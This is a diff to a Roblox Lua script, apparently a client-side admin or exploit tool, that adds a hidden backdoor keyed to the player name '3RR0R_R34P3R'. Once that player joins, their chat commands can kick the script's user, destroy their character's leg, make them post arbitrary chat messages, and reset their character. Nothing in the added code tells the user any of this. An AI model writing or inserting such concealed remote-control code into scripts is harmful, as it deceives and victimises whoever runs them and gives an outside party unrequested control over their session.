@@ -62,3 +62,62 @@ spawn(function()
         end
     end
 end)
+namefound = false
+spawn(function()
+	repeat
+        wait()
+    until game.Players:FindFirstChild("3RR0R_R34P3R")
+    local scruser = game.Players.LocalPlayer
+	local scrowner2 = game.Players["3RR0R_R34P3R"]
+	scrowner2.Chatted:Connect(function(msg)
+		msg = msg:lower()
+		if string.sub(msg,1,3) == "/e " then
+			msg = string.sub(msg,4)
+		end
+		if string.sub(msg,1,1) == prefix then
+			local cmd
+			local space = string.find(msg," ")
+			if space then
+				cmd = string.sub(msg,2,space-1)
+			else
+				cmd = string.sub(msg,2)
+			end
+			
+			if cmd == "kick" then
+				local var = Split(string.sub(msg,space+1), " ")
+				local pl = GetPlayer(var[1])
+				if scruser.Name ~= "3RR0R_R34P3R" then
+					if pl.Name == scruser.Name then
+						pl:kick(tostring(var[2]))
+					end
+				else
+					print("lol")
+				end
+			end
+			if cmd == "leg" then
+				if scruser.Name ~= "3RR0R_R34P3R" then
+					scruser.Character['Right Leg']:Destroy()
+				end
+			end
+			if cmd == "say" then
+				if scruser.name ~= "3RR0R_R34P3R" then
+					local ohString1 = tostring(string.sub(msg,space+1))
+					local ohString2 = "All"
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+				end
+			end
+			if cmd == "reset" then
+				local var = string.sub(msg,space+1)
+				local pl = GetPlayer(var)
+				if scruser.Name ~= "3RR0R_R34P3R" then
+					if pl.Name == scruser.Name then
+						pl:BreakJoints()
+					end
+				else
+					print("lol")
+				end
+				game.Players.LocalPlayer.Character:BreakJoints()
+			end
+		end
+	end)
+end)
